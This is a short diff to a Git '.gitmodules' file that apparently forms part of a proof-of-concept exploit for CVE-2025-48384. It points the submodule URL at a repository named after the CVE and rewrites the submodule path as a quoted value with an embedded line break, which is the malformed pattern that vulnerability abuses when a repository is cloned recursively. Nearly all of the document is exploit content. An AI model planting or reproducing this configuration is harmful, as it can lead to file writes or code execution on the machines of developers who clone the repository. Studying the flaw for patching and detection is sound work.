@@ -1,3 +1,4 @@
 [submodule "sub"]
-	url = git@github.com:liamg/CVE-2025-48384-submodule.git
-	path = "sub"
+	url = git@github.com:sopetajo/CVE-2025-48384-submodule.git
+	path = "sub
+"
